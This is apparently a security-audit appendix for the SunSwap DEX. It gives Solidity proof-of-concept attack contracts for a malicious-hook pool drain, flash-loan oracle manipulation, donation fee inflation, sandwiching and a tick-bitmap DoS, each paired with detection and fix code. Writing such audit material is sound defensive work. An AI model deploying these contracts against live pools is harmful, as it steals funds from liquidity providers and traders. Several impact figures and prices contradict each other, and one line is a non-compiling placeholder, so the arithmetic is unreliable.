# SunSwap Security Audit - Proof of Concept Concepts

This document provides detailed pseudocode and attack flow diagrams for exploiting identified vulnerabilities.

---

## POC 1: Malicious Hook Pool Drain (V4)

### Vulnerability
`PoolManager.swap()` passes hook-returned `amountToSwap` directly to `pool.swap()` without validation.

### Exploit Flow

```solidity
// Step 1: Deploy malicious hook contract
contract MaliciousHook is ICLHooks {
    uint256 constant INFLATION_MULTIPLIER = 100; // 100x attack
    
    function beforeSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        bytes calldata
    ) external override returns (int256 amountToSwap, BeforeSwapDelta, uint24) {
        // Return 100x the requested amount
        amountToSwap = params.amountSpecified * INFLATION_MULTIPLIER;
        return (amountToSwap, BeforeSwapDelta.wrap(bytes32(0)), 0);
    }
    
    function afterSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        BalanceDelta delta,
        bytes calldata,
        BeforeSwapDelta
    ) external override returns (BalanceDelta, BalanceDelta hookDelta) {
        // Claim all deltas as hook fee
        return (BalanceDelta.wrap(bytes32(0)), delta);
    }
}

// Step 2: Initialize pool with malicious hook
PoolKey memory key = PoolKey({
    currency0: usdc,
    currency1: trx,
    fee: 3000,
    tickSpacing: 60,
    hooks: maliciousHook,
    parameters: encodeParameters(/* with hook enabled */)
});

poolManager.initialize(key, sqrtPriceX96);

// Step 3: Trigger swap
// User thinks they're swapping 100 USDC
// Hook inflates to 10,000 USDC
// Pool has only 1M USDC liquidity
// Attack drains entire pool in one transaction

BalanceDelta result = poolManager.swap(
    key,
    SwapParams({
        zeroForOne: true,
        amountSpecified: 100e6, // 100 USDC
        sqrtPriceLimitX96: 0
    }),
    bytes("")
);
// Result: Attacker receives 100M TRX intended for LPs
```

### Impact Breakdown
- **Initial LP deposit:** 1M USDC + 100M TRX
- **Attacker swap amount:** 100 USDC (normal)
- **Executed amount:** 10,000 USDC (100x inflation)
- **LP loss:** 1% of all liquidity in single tx
- **Attack cost:** ~50 USDC in gas/energy
- **Profit:** ~900k TRX (~$450k at $0.5/TRX)

### Detection
- Monitor hook `beforeSwap` return value vs input
- Alert if returned amount > 1.1x input (10% tolerance)
- Flag new hooks with unknown history

### Prevention
```solidity
function swap(PoolKey memory key, SwapParams memory params, bytes calldata hookData)
    external override noDelegateCall isLocked whenNotPaused
    returns (BalanceDelta delta)
{
    if (params.amountSpecified == 0) revert SwapAmountCannotBeZero();

    PoolId id = key.toId();
    CLPool.State storage pool = pools[id];
    pool.checkPoolInitialized();

    (int256 amountToSwap, BeforeSwapDelta beforeSwapDelta, uint24 lpFeeOverride) =
        CLHooks.beforeSwap(key, params, hookData);
    
    // ADD THIS VALIDATION
    require(
        amountToSwap >= params.amountSpecified * 99 / 100 &&
        amountToSwap <= params.amountSpecified * 101 / 100,
        "Hook amount out of tolerance (±1%)"
    );
    
    // ... rest of function
}
```

---

## POC 2: Flash Loan Oracle Manipulation (V3)

### Vulnerability
Oracle observations can be manipulated within a single block via flash loans.

### Exploit Flow

```solidity
// Step 1: Craft flash loan callback
contract OracleAttacker {
    function executeFlashLoan() external {
        // Initial state: USDC/TRX pool
        // Price: 100 TRX = 1 USDC
        // Liquidity: 1M USDC, 100M TRX
        
        IUniswapV3Pool pool = usdcTrxPool;
        
        // Flash loan 500k USDC
        pool.flash(
            address(this),
            500_000e6,  // amount0 (USDC)
            0,          // amount1 (TRX)
            abi.encode(address(this))
        );
    }
    
    function uniswapV3FlashCallback(
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // Inside the callback, pool state is manipulated
        
        // Step 2: Swap to move price
        // We have 500k USDC from flash loan
        // Swap all for TRX
        
        bytes memory swapPath = abi.encodePacked(
            address(usdc),
            uint24(3000),
            address(trx)
        );
        
        uint256 amountOut = swapRouter.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: usdc,
                tokenOut: trx,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: 500_000e6,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        // amountOut ≈ 50M TRX (half price, price now: 50 TRX = 1 USDC)
        
        // Step 3: Read oracle while price is manipulated
        uint32[] memory secondsAgos = new uint32[](1);
        secondsAgos[0] = 0;  // Current block observation
        
        (int56[] memory tickCumulatives, ) = pool.observe(secondsAgos);
        int56 currentTick = tickCumulatives[0]; // TWAP of this block only!
        
        // Step 4: Use manipulated price for downstream protocol
        // Trigger liquidation at wrong price
        // Transfer TRX to lending protocol callback
        // Protocol sees TRX price at 50 instead of 100
        // Accepts over-collateralized position as healthy
        
        lendingProtocol.liquidate(
            borrower,
            address(this),
            abi.encode(currentTick) // Wrong price!
        );
        
        // Step 5: Repay flash loan
        uint256 fee = (amount0 * 5) / 10000; // 0.05%
        usdc.transfer(address(pool), amount0 + fee);
    }
}

// Attack execution
OracleAttacker attacker = new OracleAttacker();
attacker.executeFlashLoan();

// Results:
// - Oracle price: 50 TRX/USDC (50% discount)
// - Lending protocol liquidates collateral at 50% discount
// - Attacker profits from liquidation + TRX price recovery
```

### Math
```
Before attack:
  USDC in pool: 1M
  TRX in pool: 100M
  Price: 100 TRX = 1 USDC (fair price)
  
During attack:
  Attacker swaps 500k USDC for TRX
  New pool state: 1.5M USDC, 50M TRX
  New price: 50 TRX = 1 USDC (50% discount!)
  
Attack profit calculation:
  Attacker gets: 50M TRX
  Cost: 500k USDC + flash fee (2.5k USDC)
  Profit from liquidation: collateral * (50% discount factor)
  Total: $250k-1M+ depending on liquidations triggered
```

### Detection
- Monitor for large single-block price moves (>5%)
- Alert on flash loans >10% of pool liquidity
- Track observation timestamps—flag if using block.timestamp only

### Prevention
```solidity
// In lending protocol
function liquidate(address borrower, address recipient, bytes calldata data) external {
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = 600;  // 10 minutes ago
    secondsAgos[1] = 0;    // now
    
    (int56[] memory tickCumulatives, ) = pool.observe(secondsAgos);
    
    int56 twapTick = (tickCumulatives[1] - tickCumulatives[0]) / 600;
    
    // Only use TWAP, never current block price
    uint160 twapPrice = TickMath.getSqrtRatioAtTick(int24(twapTick));
    
    // Require current price within 5% of TWAP
    uint160 currentPrice = getCurrentPrice();
    
    require(
        currentPrice > twapPrice * 95 / 100 &&
        currentPrice < twapPrice * 105 / 100,
        "Price deviation from TWAP > 5%"
    );
}
```

---

## POC 3: Donation Fee Inflation Attack (V4)

### Vulnerability
`donate()` with low liquidity allows fee growth inflation.

### Exploit Flow

```solidity
contract DonationAttacker {
    function exploit() external {
        // Step 1: Create new pool with tiny liquidity
        PoolKey memory key = PoolKey({
            currency0: trx,
            currency1: usdc,
            fee: 3000,
            tickSpacing: 60,
            hooks: address(0),
            parameters: encodeParameters()
        });
        
        poolManager.initialize(key, sqrtPriceX96);
        
        // Step 2: Mint 1000 TRX as LP (minimal liquidity)
        poolManager.modifyLiquidity(
            key,
            ModifyLiquidityParams({
                tickLower: -10000,
                tickUpper: 10000,
                liquidityDelta: 1000,
                salt: bytes32(0)
            })
        );
        
        // At this point:
        // - Pool has 1000 TRX liquidity
        // - feeGrowthGlobal = 0
        // - Attacker owns 100% of liquidity
        
        // Step 3: Donate 10,000 USDC
        poolManager.donate(key, 0, 10_000e6, bytes(""));
        
        // Now: feeGrowthGlobal = 10_000e6 / 1000 = 10_000_000 (10M per unit liquidity)
        
        // Step 4: Attacker immediately burns position
        (BalanceDelta delta, BalanceDelta feeDelta) = poolManager.modifyLiquidity(
            key,
            ModifyLiquidityParams({
                tickLower: -10000,
                tickUpper: 10000,
                liquidityDelta: -1000,
                salt: bytes32(0)
            })
        );
        
        // Attacker receives:
        // - Returned liquidity tokens: minimal
        // - Accrued fees: 1000 * 10_000_000 = 10B (essentially all donated amount!)
        
        // Step 5: Other LPs who add liquidity after this lose all fees
        // because feeGrowthGlobal is now artificially inflated
    }
}

// Attack sequence in single transaction via lock()
function attackSequence() external {
    poolManager.lock(abi.encode(DonationAttacker(this).exploit()));
}

// Result:
// - Attacker donates 10k USDC (~$5k)
// - Attacker receives 10k USDC back as "fees"
// - Cost: only 10k USDC + gas
// - Other LPs' fees are diluted/stolen
```

### Impact
- New pool becomes griefed immediately
- Protocol unusable for small pools
- LPs lose ~50% of fees to donations
- Attack cost: minimal (donation amount)

### Detection
- Flag pools with feeGrowthGlobal > 10M without swaps
- Monitor for donation + collect in same block
- Alert if donation > 10x pool liquidity

### Prevention
```solidity
function donate(PoolKey memory key, uint256 amount0, uint256 amount1, bytes calldata hookData)
    external override isLocked whenNotPaused
    returns (BalanceDelta delta)
{
    PoolId id = key.toId();
    CLPool.State storage pool = pools[id];
    pool.checkPoolInitialized();
    
    // ADD: Minimum liquidity check
    require(
        pool.liquidity > 100_000,  // Minimum 100k units
        "Pool liquidity too low for donations"
    );
    
    // ADD: Donation cap
    require(
        amount0 <= pool.liquidity * 10 &&
        amount1 <= pool.liquidity * 10,
        "Donation exceeds 10x pool liquidity"
    );
    
    CLHooks.beforeDonate(key, amount0, amount1, hookData);
    delta = pool.donate(amount0, amount1);
    emit Donate(id, msg.sender, amount0, amount1);
    CLHooks.afterDonate(key, amount0, amount1, hookData);
}
```

---

## POC 4: Sandwich Attack (V3 SwapRouter)

### Vulnerability
No built-in MEV resistance on V3 swaps.

### Exploit Flow

```solidity
contract SandwichAttacker {
    ISwapRouter swapRouter;
    IERC20 usdc;
    IERC20 trx;
    
    function monitorAndAttack(
        address victim,
        uint256 userAmount,
        uint256 expectedOutput
    ) external {
        // This runs off-chain via mempool monitoring
        
        // Step 1: User broadcasts swap tx
        // "swap 1000 USDC for TRX, min output = 0"
        
        // Step 2: Front-run with large buy
        uint256 frontAmount = userAmount * 10;  // Buy 10,000 USDC worth
        
        swapRouter.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(usdc),
                tokenOut: address(trx),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: frontAmount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        
        // Price moves 3-5% worse due to our buy
        
        // Step 3: User's tx executes at worse price
        // User: 1000 USDC → 95 TRX (instead of 100 TRX)
        // Lost: 5 TRX (~$2.5k at $500/TRX)
        
        // Step 4: Back-run with sell
        uint256 trxReceived = /* amount from front-run */;
        
        swapRouter.exactOutputSingle(
            ISwapRouter.ExactOutputSingleParams({
                tokenIn: address(trx),
                tokenOut: address(usdc),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountOut: frontAmount,  // Recover original USDC
                amountInMaximum: trxReceived
            })
        );
        
        // Attacker profit: (trxReceived - amount_sold) = 3-5% of frontAmount
        // = 300-500 USDC profit
    }
}

// Weekly attack volume on major chains: $100k-1M
// Per-transaction sandwich: 3-20% slippage
```

### Math
```
Victim swap:
  Input: 1000 USDC
  Expected: 100 TRX (at fair price)
  Minimum: 0 (NO PROTECTION!)
  
Attacker front-run:
  Buy: 10,000 USDC worth TRX
  Impact: Price up 5%
  
Victim execution:
  Gets: 95 TRX (5% worse)
  Loss: 5 TRX = $2,500
  
Attacker back-run:
  Sell at higher price
  Profit: 3-5% = $150-250
  
Attacker cost: gas only ($1-5)
Net profit: $145-249 per sandwich
```

### Prevention
```solidity
function exactInputSingle(ExactInputSingleParams calldata params)
    external payable override returns (uint256 amountOut)
{
    // ADD: Enforce minimum slippage
    uint256 expectedAmount = quoter.quoteExactInputSingle(
        params.tokenIn,
        params.tokenOut,
        params.fee,
        params.amountIn
    );
    
    uint256 minSlippage = expectedAmount * 99 / 100;  // 1% max slippage
    
    require(
        params.amountOutMinimum >= minSlippage,
        "minOut too low, max 1% slippage"
    );
    
    // Rest of function...
}
```

---

## POC 5: Tick Bitmap DOS Attack (V3)

### Vulnerability
Empty ticks increase swap gas costs linearly.

### Exploit Flow

```solidity
contract TickBitmapDoS {
    function polluteBitmap(address poolAddress) external {
        IUniswapV3Pool pool = IUniswapV3Pool(poolAddress);
        
        // Initialize 500 consecutive empty tick ranges
        // Each initialization: ~50k gas
        // Total cost: 500 * 50k = 25M gas (~$1k at current prices)
        
        for (int24 i = -5000; i < 0; i += 10) {
            pool.mint(
                address(this),
                i,
                i + 10,
                1,  // Minimum liquidity (1 wei)
                bytes("")
            );
        }
        
        // Now pool has 500 empty ticks in bitmap
        
        // Regular swap now costs:
        // Base: 100k gas
        // With 500 empty ticks: 300-500k gas (3-5x)
        
        // This makes pool unusable for small swaps
    }
    
    function uniswapV3MintCallback(
        uint256 amount0,
        uint256 amount1,
        bytes calldata
    ) external {
        // Minimal payment to satisfy callback
        IERC20(USDC).transfer(msg.sender, 1);
        IERC20(TRX).transfer(msg.sender, 1);
    }
}

// Attack cost: ~$1,000
// Target pool impacts: 1000+ users, each paying 2-4x higher gas
// Total extracted from users: $50k-100k+
```

### Detection
- Monitor empty ticks initialized per block
- Alert if >10 empty ticks initialized in single tx
- Track gas cost per swap—flag if 3x average

### Prevention
```solidity
function mint(
    address recipient,
    int24 tickLower,
    int24 tickUpper,
    uint128 amount,
    bytes calldata data
) external override lock returns (uint256 amount0, uint256 amount1) {
    require(amount > 0);
    
    // ADD: Require minimum liquidity per tick
    require(
        amount >= 1000,  // Minimum 1000 wei
        "Liquidity too small"
    );
    
    // ... rest of function
}
```

---

## Testing Recommendations

### Hardhat/Foundry Test Template

```solidity
// test/SunSwapExploits.t.sol
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/PoolManager.sol";

contract SunSwapExploitTests is Test {
    function testMaliciousHookDrain() public {
        // Setup pool with malicious hook
        // Execute swap with hook inflation
        // Assert pool is drained
    }
    
    function testFlashLoanOracleManipulation() public {
        // Execute flash loan callback
        // Read oracle during callback
        // Assert price is manipulated >5%
    }
    
    function testDonationInflation() public {
        // Create low-liquidity pool
        // Donate large amount
        // Collect immediately
        // Assert attacker receives all donated amount
    }
    
    function testTickBitmapGasIncrease() public {
        // Pollute bitmap with empty ticks
        // Measure gas for swap before/after
        // Assert 3-5x gas increase
    }
}
```

---

## Remediation Cost Estimation

| Vulnerability | Severity | Fix Cost | Timeline |
|---|---|---|---|
| Hook Validation | CRITICAL | $50-100k | 2 weeks |
| Oracle Circuit Breaker | CRITICAL | $30-50k | 1 week |
| Donation Caps | HIGH | $20-30k | 3 days |
| Slippage Enforcement | HIGH | $10-20k | 2 days |
| Tick DOS Mitigation | MEDIUM | $40-60k | 1 week |
| Audit & Testing | N/A | $100-150k | 4 weeks |
| **Total** | - | **$250-410k** | **6-8 weeks** |

